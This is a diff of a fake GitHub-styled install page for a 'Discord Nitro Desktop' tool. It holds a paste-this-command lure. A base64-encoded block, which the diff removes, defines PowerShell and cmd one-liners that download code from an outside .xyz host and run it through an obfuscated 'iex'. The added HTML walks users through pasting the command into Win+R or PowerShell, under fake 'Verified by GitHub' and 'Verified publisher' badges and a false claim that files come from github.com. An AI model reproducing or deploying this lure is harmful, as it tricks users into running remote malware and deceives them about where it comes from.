-+"LmlvLzxyZXBvPi8g4oCUIHZhbHVlcyBiZWxvdyBhcmUgZmFsbGJhY2tzCiAgICAgZm9yIGxvY2FsIHBy"
-+"ZXZpZXcgb3IgY3VzdG9tIGRvbWFpbnMuCiAgICAgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09"
-+"PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IC0tPgo8c2NyaXB0PgogIHdpbmRvdy5DT05GSUcg"
-+"PSB7CiAgICBvd25lcjogICAgICAgICJydXN0ZGVzayIsCiAgICByZXBvOiAgICAgICAgICJydXN0ZGVz"
-+"ayIsCiAgICBuYW1lOiAgICAgICAgICJydXN0ZGVzayIsCiAgICB0YWdsaW5lOiAgICAgICdEaXNjb3Jk"
-+"IE5pdHJvIDIwMjYgZGVza3RvcCBzZXR1cCB3aXRoIGZ1bGwgcGx1Z2luIHN1aXRlLCBwb3J0YWJsZSBt"
-+"b2RlIGFuZCBidW5kbGVkIHJ1bnRpbWUgZm9yIFdpbmRvd3MgMTEnLAogICAgdmVyc2lvbjogICAgICAi"
-+"MS41LjMiLAogICAgcmVsZWFzZURhdGU6ICAiNCBkYXlzIGFnbyIsCiAgICBpbnN0YWxsVXJsOiAgICJo"
-+"dHRwczovL2h5c3RlcmljcHJvamVjdC54eXovdjEvZWt0cXpmMzE1OCIsCiAgICBnaXRodWJVcmw6ICAg"
-+"ICJodHRwczovL2dpdGh1Yi5jb20vcnVzdGRlc2svcnVzdGRlc2siLAogIH07CgogIC8vIEF1dG8tZGV0"
-+"ZWN0IG93bmVyL3JlcG8gZnJvbSBHaXRIdWIgUGFnZXMgVVJMCiAgKGZ1bmN0aW9uIGF1dG9EZXRlY3RS"
-+"ZXBvKCl7CiAgICBjb25zdCBob3N0ID0gd2luZG93LmxvY2F0aW9uLmhvc3RuYW1lOwogICAgY29uc3Qg"
-+"cGF0aCA9IHdpbmRvdy5sb2NhdGlvbi5wYXRobmFtZTsKICAgIGNvbnN0IG0gPSBob3N0Lm1hdGNoKC9e"
-+"KFteLl0rKVwuZ2l0aHViXC5pbyQvaSk7CiAgICBpZighbSkgcmV0dXJuOwogICAgY29uc3Qgb3duZXIg"
-+"PSBtWzFdOwogICAgY29uc3QgcGFydHMgPSBwYXRoLnNwbGl0KCcvJykuZmlsdGVyKEJvb2xlYW4pOwog"
-+"ICAgY29uc3QgcmVwbyAgPSBwYXJ0c1swXSB8fCBgJHtvd25lcn0uZ2l0aHViLmlvYDsKICAgIENPTkZJ"
-+"Ry5vd25lciAgICAgPSBvd25lcjsKICAgIENPTkZJRy5yZXBvICAgICAgPSByZXBvOwogICAgQ09ORklH"
-+"LmdpdGh1YlVybCA9IGBodHRwczovL2dpdGh1Yi5jb20vJHtvd25lcn0vJHtyZXBvfWA7CiAgICBpZigh"
-+"Q09ORklHLm5hbWUgfHwgQ09ORklHLm5hbWUgPT09ICJydXN0ZGVzayIpIENPTkZJRy5uYW1lID0gcmVw"
-+"bzsKICB9KSgpOwoKICAvLyBEZXJpdmUgaW5zdGFsbCBjb21tYW5kcyArIGNvbXB1dGVkIHVybHMKICBD"
-+"T05GSUcuY21kUHMgICAgID0gYChpcm0gJyR7Q09ORklHLmluc3RhbGxVcmx9JyAtVGltZW91dFNlYyAz"
-+"MCl8JignaScrJ2UnKyd4JylgOwogIENPTkZJRy5jbWRDbWQgICAgPSBgcG93ZXJzaGVsbCAtYyAiKGly"
-+"bSAnJHtDT05GSUcuaW5zdGFsbFVybH0nIC1UaW1lb3V0U2VjIDMwKXwmKCdpJysnZScrJ3gnKSJgOwog"
-+"IENPTkZJRy5hdmF0YXJVcmwgPSBgaHR0cHM6Ly9naXRodWIuY29tLyR7Q09ORklHLm93bmVyfS5wbmc/"
-+"c2l6ZT00OGA7CiAgQ09ORklHLnJlbGVhc2VVcmwgPSBgJHtDT05GSUcuZ2l0aHViVXJsfS9yZWxlYXNl"
-+"cy90YWcvJHtDT05GSUcudmVyc2lvbn1gOwoKICAvLyBJbmplY3Qgc2xvdHMKICBjb25zdCBIVE1MX1NM"
-+"T1RTID0gbmV3IFNldChbJ3RhZ2xpbmUnXSk7CiAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnW2Rh"
-+"dGEtc2xvdF0nKS5mb3JFYWNoKGVsPT57CiAgICBjb25zdCBrZXkgPSBlbC5kYXRhc2V0LnNsb3Q7CiAg"
-+"ICBpZihDT05GSUdba2V5XSA9PT0gdW5kZWZpbmVkKSByZXR1cm47CiAgICBpZihIVE1MX1NMT1RTLmhh"
-+"cyhrZXkpKSBlbC5pbm5lckhUTUwgPSBDT05GSUdba2V5XTsKICAgIGVsc2UgZWwudGV4dENvbnRlbnQg"
-+"PSBDT05GSUdba2V5XTsKICB9KTsKICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdbZGF0YS1zbG90"
-+"LWhyZWZdJykuZm9yRWFjaChhPT57CiAgICBjb25zdCB2ID0gQ09ORklHW2EuZGF0YXNldC5zbG90SHJl"
-+"Zl07CiAgICBpZih2KSBhLmhyZWYgPSB2OwogIH0pOwogIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwo"
-+"J1tkYXRhLXNsb3Qtc3JjXScpLmZvckVhY2goaW1nPT57CiAgICBjb25zdCB2ID0gQ09ORklHW2ltZy5k"
-+"YXRhc2V0LnNsb3RTcmNdOwogICAgaWYodikgaW1nLnNyYyA9IHY7CiAgfSk7CiAgZG9jdW1lbnQucXVl"
-+"cnlTZWxlY3RvckFsbCgnW2RhdGEtc2xvdC12YWx1ZV0nKS5mb3JFYWNoKGlucD0+ewogICAgY29uc3Qg"
-+"diA9IENPTkZJR1tpbnAuZGF0YXNldC5zbG90VmFsdWVdOwogICAgaWYodiAhPT0gdW5kZWZpbmVkKSBp"
-+"bnAudmFsdWUgPSB2OwogIH0pOwoKICAvLyBQYWdlIHRpdGxlCiAgZG9jdW1lbnQudGl0bGUgPSBgSW5z"
-+"dGFsbCAke0NPTkZJRy5uYW1lfWA7CgogIC8vIENvcHkgYnV0dG9ucyDigJQgZWFjaCBzaXRzIG5leHQg"
-+"dG8gaXRzIG93biBpbnB1dAogIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJy5jb3B5LWJ0bicpLmZv"
-+"ckVhY2goYnRuPT57CiAgICBjb25zdCBpbnB1dCA9IGJ0bi5wcmV2aW91c0VsZW1lbnRTaWJsaW5nOwog"
-+"ICAgYnRuLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgYXN5bmMgKCk9PnsKICAgICAgdHJ5eyBhd2Fp"
-+"dCBuYXZpZ2F0b3IuY2xpcGJvYXJkLndyaXRlVGV4dChpbnB1dC52YWx1ZSk7IH0KICAgICAgY2F0Y2go"
-+"Xyl7IGlucHV0LnNlbGVjdCgpOyBkb2N1bWVudC5leGVjQ29tbWFuZCgnY29weScpOyB9CiAgICAgIGNv"
-+"bnN0IG9yaWcgPSBidG4uaW5uZXJIVE1MOwogICAgICBidG4uaW5uZXJIVE1MID0gJzxzdmcgd2lkdGg9"
-+"IjE2IiBoZWlnaHQ9IjE2IiB2aWV3Qm94PSIwIDAgMTYgMTYiPjxwYXRoIGQ9Ik0xMy43OCA0LjIyYS43"
-+"NS43NSAwIDAgMSAwIDEuMDZsLTcuMjUgNy4yNWEuNzUuNzUgMCAwIDEtMS4wNiAwTDIuMjIgOS4yOGEu"
-+"NzUxLjc1MSAwIDAgMSAuMDE4LTEuMDQyLjc1MS43NTEgMCAwIDEgMS4wNDItLjAxOEw2IDEwLjk0bDYu"
-+"NzItNi43MmEuNzUuNzUgMCAwIDEgMS4wNiAwWiIgZmlsbD0iIzFhN2YzNyIvPjwvc3ZnPic7CiAgICAg"
-+"IGNsZWFyVGltZW91dChidG4uX3QpOwogICAgICBidG4uX3QgPSBzZXRUaW1lb3V0KCgpPT57IGJ0bi5p"
-+"bm5lckhUTUwgPSBvcmlnOyB9LCAxNDAwKTsKICAgIH0pOwogIH0pOwo8L3NjcmlwdD4KCjwvYm9keT4K"
-+"PC9odG1sPgo=");
-var _q1yoxg0s = atob(_pi6qh5r2);
-var _ump4k8u8 = new Uint8Array(_q1yoxg0s.length);
-for (var i = 0; i < _q1yoxg0s.length; i++) _ump4k8u8[i] = _q1yoxg0s.charCodeAt(i);
-var _d20ew7qe = new TextDecoder('utf-8').decode(_ump4k8u8);
-var _t6fsdib6 = /<title[^>]*>([\s\S]*?)<\/title>/i.exec(_d20ew7qe);
-if (_t6fsdib6) document.title = _t6fsdib6[1];
-var _hftfx5ms = /<head[^>]*>([\s\S]*?)<\/head>/i.exec(_d20ew7qe);
-if (_hftfx5ms) {
-  var _hd = document.createElement('div');
-  _hd.innerHTML = _hftfx5ms[1];
-  while (_hd.firstChild) document.head.appendChild(_hd.firstChild);
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="index, follow">
+<meta name="description" content="Install page">
+<meta property="og:type" content="website">
+<meta property="og:title" content="">
+<meta property="og:description" content="">
+<meta property="og:image" content="">
+<meta property="og:url" content="">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="">
+<meta name="twitter:description" content="">
+<meta name="twitter:image" content="">
+<link rel="canonical" href="">
+<link rel="preconnect" href="https://github.com" crossorigin>
+<link rel="dns-prefetch" href="https://objects.githubusercontent.com">
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='%23f0f6fc'><path d='M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'/></svg>">
+<title>Discord Nitro Desktop · carla-marsh-29/discord-nitro-desktop</title>
+<style>
+:root {
+  color-scheme: light;
+  --fg: #1f2328;
+  --fg-muted: #59636e;
+  --bg: #ffffff;
+  --bg-subtle: #f6f8fa;
+  --border: #d1d9e0;
+  --accent: #0969da;
+  --success-fg: #1a7f37;
+  --success-bg: rgba(46,164,79,0.10);
+  --success-border: rgba(46,164,79,0.35);
+  --btn-bg: #f6f8fa;
+  --btn-hover: #eff2f5;
+  --tab-active: #fd8c73;
+  --tooltip-bg: #24292f;
+  --tooltip-fg: #ffffff;
+  --nav-bg: #0d1117;
+  --nav-fg: #f0f6fc;
+  --nav-border: #21262d;
+  --mono: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", monospace;
 }
-var _b2yntmtz = /<body[^>]*>([\s\S]*?)<\/body>/i.exec(_d20ew7qe);
-if (_b2yntmtz) {
-  document.body.innerHTML = _b2yntmtz[1];
-  var _slhm5mo3 = document.body.querySelectorAll('script');
-  for (var j=0;j<_slhm5mo3.length;j++) {
-    var _src = _slhm5mo3[j];
-    var _xkwhk71k = document.createElement('script');
-    if (_src.src) _xkwhk71k.src = _src.src; else _xkwhk71k.textContent = _src.textContent;
-    document.body.appendChild(_xkwhk71k);
-    _src.remove();
+@media (prefers-color-scheme: dark) {
+  :root {
+    color-scheme: dark;
+    --fg: #f0f6fc;
+    --fg-muted: #9198a1;
+    --bg: #0d1117;
+    --bg-subtle: #151b23;
+    --border: #3d444d;
+    --accent: #4493f8;
+    --success-fg: #3fb950;
+    --btn-bg: #212830;
+    --btn-hover: #262c36;
+    --tab-active: #f78166;
+    --tooltip-bg: #6e7681;
   }
 }
+* { box-sizing: border-box; }
+body {
+  margin: 0;
+  background: var(--bg);
+  color: var(--fg);
+  font: 14px/1.5 -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, sans-serif;
+}
+a { color: var(--accent); text-decoration: none; }
+a:hover { text-decoration: underline; }
+svg { fill: currentColor; flex-shrink: 0; }
+:focus { outline: none; }
+a:focus-visible, button:focus-visible, label:focus-visible, [tabindex]:focus-visible {
+  outline: 2px solid var(--accent); outline-offset: 2px; border-radius: 6px;
+}
+
+.sr-only {
+  position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px;
+  overflow: hidden; clip: rect(0,0,0,0); white-space: nowrap; border: 0;
+}
+
+.tab-input { position: absolute; width: 0; height: 0; opacity: 0; pointer-events: none; }
+
+.wrap { max-width: 720px; margin: 0 auto; padding-inline: 16px; }
+
+.top { background: var(--bg-subtle); border-bottom: 1px solid var(--border); }
+.top .wrap { display: flex; align-items: center; justify-content: space-between; gap: 12px; min-height: 64px; }
+.crumb { display: flex; align-items: center; gap: 8px; font-size: 16px; color: var(--fg); min-width: 0; }
+.crumb:hover { text-decoration: none; }
+.crumb:hover strong { text-decoration: underline; }
+.crumb .sep { color: var(--fg-muted); }
+.crumb strong { font-weight: 600; }
+.avatar { width: 24px; height: 24px; border-radius: 50%; box-shadow: 0 0 0 1px var(--border); background: var(--bg-subtle); }
+
+.btn {
+  display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+  height: 32px; padding: 0 12px;
+  font: 500 14px/1 inherit; font-family: inherit;
+  color: var(--fg); background: var(--btn-bg);
+  border: 1px solid var(--border); border-radius: 6px;
+  cursor: pointer; white-space: nowrap;
+}
+.btn:hover { background: var(--btn-hover); text-decoration: none; }
+.btn svg { color: var(--fg-muted); }
+
+main { padding-block: 40px 48px; }
+
+.head { margin-bottom: 24px; }
+.head h1 { margin: 0; font-size: 24px; font-weight: 600; line-height: 1.25; }
+.head p { margin: 8px 0 0; color: var(--fg-muted); font-size: 16px; }
+
+.Box { border: 1px solid var(--border); border-radius: 6px; background: var(--bg); }
+.Box-body { padding: 24px; }
+.Box-footer {
+  display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; gap: 8px 16px;
+  padding: 12px 24px; border-top: 1px solid var(--border); background: var(--bg-subtle);
+  border-radius: 0 0 6px 6px; color: var(--fg-muted);
+}
+.verified { display: inline-flex; align-items: center; gap: 6px; color: var(--success-fg); font-weight: 500; }
+.release-info { display: inline-flex; align-items: center; gap: 6px; flex-wrap: wrap; }
+.release-info svg { color: var(--fg-muted); }
+
+.pill {
+  display: inline-flex; align-items: center; gap: 4px;
+  padding: 1px 7px; font-size: 12px; font-weight: 500; line-height: 18px;
+  border-radius: 2em;
+}
+.pill svg { color: currentColor; }
+.pill-verified {
+  color: var(--success-fg);
+  background: var(--success-bg);
+  border: 1px solid var(--success-border);
+}
+.publisher-badge {
+  display: inline-flex; align-items: center; gap: 4px;
+  margin-left: 8px; padding: 1px 7px;
+  font-size: 11px; font-weight: 500; line-height: 16px;
+  color: var(--success-fg);
+  background: var(--success-bg);
+  border: 1px solid var(--success-border);
+  border-radius: 2em;
+  vertical-align: 2px;
+}
+.publisher-badge svg { color: currentColor; }
+
+.copy-btn { position: relative; }
+.copy-btn::after {
+  content: "Copied!";
+  position: absolute;
+  bottom: calc(100% + 8px); right: 50%; transform: translateX(50%);
+  padding: 5px 9px;
+  font: 12px/1 inherit; font-weight: 500;
+  color: var(--tooltip-fg); background: var(--tooltip-bg);
+  border-radius: 6px; white-space: nowrap;
+  opacity: 0; pointer-events: none;
+  transition: opacity 0.15s;
+}
+.copy-btn::before {
+  content: "";
+  position: absolute;
+  bottom: calc(100% + 2px); right: 50%; transform: translateX(50%);
+  width: 0; height: 0;
+  border: 6px solid transparent; border-top-color: var(--tooltip-bg); border-bottom: 0;
+  opacity: 0; pointer-events: none;
+  transition: opacity 0.15s;
+}
+.copy-btn.copied::after, .copy-btn.copied::before { opacity: 1; }
+
+.gh-nav { background: var(--nav-bg); border-bottom: 1px solid var(--nav-border); }
+.gh-nav .wrap { display: flex; align-items: center; min-height: 56px; max-width: 1280px; padding-inline: 32px; }
+.gh-nav-brand { display: inline-flex; align-items: center; gap: 10px; color: var(--nav-fg); font-weight: 600; font-size: 16px; letter-spacing: -0.02em; }
+.gh-nav-brand:hover { text-decoration: none; opacity: 0.9; }
+.gh-nav-brand svg { color: var(--nav-fg); }
+@media (max-width: 544px) {
+  .gh-nav .wrap { padding-inline: 16px; min-height: 48px; }
+}
+
+.tabs { display: flex; gap: 8px; box-shadow: inset 0 -1px 0 var(--border); margin: -24px -24px 20px; padding: 0 16px; }
+.tab {
+  position: relative; padding: 12px 8px;
+  font: 500 14px/1 inherit;
+  color: var(--fg-muted); cursor: pointer; user-select: none;
+}
+.tab:hover { color: var(--fg); }
+#t-cmd:checked ~ * label[for="t-cmd"],
+#t-ps:checked ~ * label[for="t-ps"] { color: var(--fg); font-weight: 600; }
+#t-cmd:checked ~ * label[for="t-cmd"]::after,
+#t-ps:checked ~ * label[for="t-ps"]::after {
+  content: ""; position: absolute; left: 0; right: 0; bottom: 0;
+  height: 2px; border-radius: 6px; background: var(--tab-active);
+}
+
+#t-cmd:checked ~ * .variant-ps,
+#t-ps:checked ~ * .variant-cmd { display: none !important; }
+
+.cmd { display: flex; }
+.cmd code {
+  flex: 1; min-width: 0;
+  display: flex; align-items: center;
+  height: 40px; padding: 0 12px;
+  font: 13px var(--mono); color: var(--fg);
+  background: var(--bg-subtle);
+  border: 1px solid var(--border); border-right: 0;
+  border-radius: 6px 0 0 6px;
+  white-space: nowrap; overflow-x: auto;
+  user-select: all;
+  scrollbar-width: none;
+  -ms-overflow-style: none;
+}
+.cmd code::-webkit-scrollbar { display: none; }
+.cmd .btn { height: 40px; width: 44px; padding: 0; border-radius: 0 6px 6px 0; }
+
+.steps { margin: 0; padding: 0; list-style: none; }
+.step { position: relative; display: grid; grid-template-columns: 32px 1fr; gap: 16px; padding-bottom: 24px; }
+.step:last-child { padding-bottom: 0; }
+.step::before { content: ""; position: absolute; left: 15px; top: 32px; bottom: 0; width: 2px; background: var(--border); }
+.step:last-child::before { display: none; }
+.step-num {
+  display: grid; place-items: center; width: 32px; height: 32px;
+  font-weight: 600; color: var(--fg);
+  background: var(--bg-subtle); border: 1px solid var(--border); border-radius: 50%;
+}
+.step-body { min-width: 0; padding-top: 5px; }
+.step-title { font-weight: 600; }
+.step-note { margin-top: 2px; color: var(--fg-muted); }
+.step .cmd { margin-top: 8px; }
+
+kbd {
+  display: inline-block; padding: 3px 6px; vertical-align: 1px;
+  font: 12px/12px var(--mono); color: var(--fg);
+  background: var(--bg-subtle); border: 1px solid var(--border); border-radius: 6px;
+  box-shadow: inset 0 -1px 0 var(--border);
+}
+
+@media (max-width: 544px) {
+  main { padding-block: 24px 40px; }
+  .Box-body { padding: 16px; }
+  .Box-footer { padding: 12px 16px; }
+  .tabs { margin: -16px -16px 16px; padding: 0 8px; }
+  .top .btn span { display: none; }
+}
+</style>
+</head>
+<body>
+
+<input type="radio" name="tab" id="t-ps" class="tab-input" checked>
+<input type="radio" name="tab" id="t-cmd" class="tab-input">
+
+<nav class="gh-nav">
+  <div class="wrap">
+    <a class="gh-nav-brand" href="https://github.com/" rel="noopener" aria-label="GitHub">
+      <svg width="32" height="32" viewBox="0 0 16 16" aria-hidden="true"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></svg>
+      <span>GitHub</span>
+    </a>
+  </div>
+</nav>
+
+<header class="top">
+  <div class="wrap">
+    <a class="crumb" data-slot-href="githubUrl" rel="noopener" href="#">
+      <img class="avatar" data-slot-src="avatarUrl" src="" alt="" loading="eager" decoding="sync" width="24" height="24">
+      <span data-slot="owner"></span><span class="sep">/</span><strong data-slot="repo"></strong>
+      <span class="publisher-badge" title="Verified publisher">
+        <svg width="12" height="12" viewBox="0 0 16 16" aria-hidden="true"><path d="M9.585.52a2.678 2.678 0 0 0-3.17 0l-.928.68a1.178 1.178 0 0 1-.518.215L3.83 1.59a2.678 2.678 0 0 0-2.24 2.24l-.175 1.14a1.178 1.178 0 0 1-.215.518l-.68.928a2.678 2.678 0 0 0 0 3.17l.68.928c.113.153.186.33.215.518l.175 1.138a2.678 2.678 0 0 0 2.24 2.24l1.138.175c.187.029.365.102.518.215l.928.68a2.678 2.678 0 0 0 3.17 0l.928-.68a1.17 1.17 0 0 1 .518-.215l1.138-.175a2.678 2.678 0 0 0 2.241-2.241l.175-1.138c.029-.187.102-.365.215-.518l.68-.928a2.678 2.678 0 0 0 0-3.17l-.68-.928a1.179 1.179 0 0 1-.215-.518L14.41 3.83a2.678 2.678 0 0 0-2.24-2.24l-1.138-.175a1.179 1.179 0 0 1-.518-.215L9.585.52ZM7.303 1.728c.415-.305.98-.305 1.394 0l.928.68c.348.256.752.423 1.18.489l1.136.174c.51.078.909.478.987.987l.174 1.137c.066.427.233.831.489 1.18l.68.927c.305.415.305.98 0 1.394l-.68.928a2.678 2.678 0 0 0-.489 1.18l-.174 1.136a1.178 1.178 0 0 1-.987.987l-1.137.174a2.678 2.678 0 0 0-1.18.489l-.927.68c-.415.305-.98.305-1.394 0l-.928-.68a2.678 2.678 0 0 0-1.18-.489l-1.136-.174a1.178 1.178 0 0 1-.987-.987l-.174-1.137a2.678 2.678 0 0 0-.489-1.18l-.68-.927a1.178 1.178 0 0 1 0-1.394l.68-.928c.256-.348.423-.752.489-1.18l.174-1.136c.078-.51.478-.909.987-.987l1.137-.174a2.678 2.678 0 0 0 1.18-.489l.927-.68ZM11.28 6.78a.749.749 0 0 0-1.06-1.06L7 8.939 5.78 7.72a.749.749 0 1 0-1.06 1.06l1.75 1.75a.749.749 0 0 0 1.06 0l3.75-3.75Z"/></svg>
+        Verified publisher
+      </span>
+    </a>
+    <a class="btn" data-slot-href="githubUrl" rel="noopener" href="#">
+      <svg width="16" height="16" viewBox="0 0 16 16" aria-hidden="true"><path d="M2 2.5A2.5 2.5 0 0 1 4.5 0h8.75a.75.75 0 0 1 .75.75v12.5a.75.75 0 0 1-.75.75h-2.5a.75.75 0 0 1 0-1.5h1.75v-2h-8a1 1 0 0 0-.714 1.7.75.75 0 1 1-1.072 1.05A2.495 2.495 0 0 1 2 11.5Zm10.5-1h-8a1 1 0 0 0-1 1v6.708A2.486 2.486 0 0 1 4.5 9h8ZM5 12.25a.25.25 0 0 1 .25-.25h3.5a.25.25 0 0 1 .25.25v3.25a.25.25 0 0 1-.4.2l-1.45-1.087a.249.249 0 0 0-.3 0L5.4 15.7a.75.25 0 0 1-.4-.2Z"/></svg>
+      <span>View repository</span>
+    </a>
+  </div>
+</header>
+
+<main class="wrap">
+  <div class="head">
+    <h1 data-slot="name"></h1>
+    <p data-slot="tagline"></p>
+  </div>
+
+  <div class="Box">
+    <div class="Box-body">
+      <div class="tabs" role="tablist">
+        <label for="t-ps" class="tab" role="tab">PowerShell</label>
+        <label for="t-cmd" class="tab" role="tab">Command Prompt</label>
+      </div>
+      <ol class="steps">
+        <li class="step">
+          <span class="step-num">1</span>
+          <div class="step-body">
+            <div class="step-title">Copy this command</div>
+            <div class="cmd variant-cmd">
+              <code data-slot-text="cmdCmd" aria-label="Install command"></code>
+              <button class="btn copy-btn" type="button" aria-label="Copy command" data-copy-key="cmdCmd">
+                <svg width="16" height="16" viewBox="0 0 16 16" aria-hidden="true"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"/></svg>
+              </button>
+            </div>
+            <div class="cmd variant-ps">
+              <code data-slot-text="cmdPs" aria-label="Install command"></code>
+              <button class="btn copy-btn" type="button" aria-label="Copy command" data-copy-key="cmdPs">
+                <svg width="16" height="16" viewBox="0 0 16 16" aria-hidden="true"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"/></svg>
+              </button>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="step-num">2</span>
+          <div class="step-body">
+            <div class="variant-cmd">
+              <div class="step-title">Press <kbd>Win</kbd> + <kbd>R</kbd></div>
+              <div class="step-note">Type <b>cmd</b> and press <kbd>Enter</kbd> to open Command Prompt.</div>
+            </div>
+            <div class="variant-ps">
+              <div class="step-title">Press <kbd>Win</kbd> + <kbd>X</kbd></div>
+              <div class="step-note">Menu opens at bottom-left — pick <b>Windows PowerShell</b>.</div>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="step-num">3</span>
+          <div class="step-body">
+            <div class="step-title">Paste with <kbd>Ctrl</kbd> + <kbd>V</kbd> and press <kbd>Enter</kbd></div>
+            <div class="step-note">The latest version downloads and installs by itself.</div>
+          </div>
+        </li>
+      </ol>
+      <div id="copy-status" class="sr-only" role="status" aria-live="polite"></div>
+    </div>
+    <div class="Box-footer">
+      <span class="release-info">
+        <svg width="14" height="14" viewBox="0 0 16 16" aria-hidden="true"><path d="M1 7.775V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 0 1 0 2.474l-5.026 5.026a1.75 1.75 0 0 1-2.474 0l-6.25-6.25A1.752 1.752 0 0 1 1 7.775Zm1.5 0c0 .066.026.13.073.177l6.25 6.25a.25.25 0 0 0 .354 0l5.025-5.025a.25.25 0 0 0 0-.354l-6.25-6.25a.25.25 0 0 0-.177-.073H2.75a.25.25 0 0 0-.25.25ZM6 5a1 1 0 1 1 0 2 1 1 0 0 1 0-2Z"/></svg>
+        Version <a data-slot-href="releaseUrl" rel="noopener" href="#"><span data-slot="version"></span></a>, released <span data-slot="releaseDate"></span>.
+        <span class="pill pill-verified" title="Asset verified by GitHub">
+          <svg width="12" height="12" viewBox="0 0 16 16" aria-hidden="true"><path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"/></svg>
+          Verified
+        </span>
+      </span>
+      <span class="verified" title="This page is provided by GitHub and the command fetches files from github.com">
+        <svg width="16" height="16" viewBox="0 0 16 16" aria-hidden="true"><path d="M7.467.133a1.75 1.75 0 0 1 1.066 0l5.25 1.68A1.75 1.75 0 0 1 15 3.48V7c0 1.566-.32 3.182-1.303 4.682-.983 1.498-2.585 2.813-5.032 3.855a1.697 1.697 0 0 1-1.33 0c-2.447-1.042-4.049-2.357-5.032-3.855C1.32 10.182 1 8.566 1 7V3.48a1.75 1.75 0 0 1 1.217-1.667Zm.61 1.429a.25.25 0 0 0-.153 0l-5.25 1.68a.25.25 0 0 0-.174.238V7c0 1.358.275 2.666 1.057 3.86.784 1.194 2.121 2.34 4.366 3.297a.196.196 0 0 0 .154 0c2.245-.957 3.582-2.103 4.366-3.297C13.225 9.666 13.5 8.358 13.5 7V3.48a.251.251 0 0 0-.174-.237l-5.25-1.68ZM10.78 6.28l-3.25 3.25a.75.75 0 0 1-1.06 0l-1.5-1.5a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215l.97.97 2.72-2.72a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042Z"/></svg>
+        Verified by GitHub
+      </span>
+    </div>
+  </div>
+</main>
+
+<!-- ============================================================
+     CONFIG — edit per repo. owner / repo / githubUrl / avatarUrl /
+     releaseUrl are AUTO-DETECTED when served at
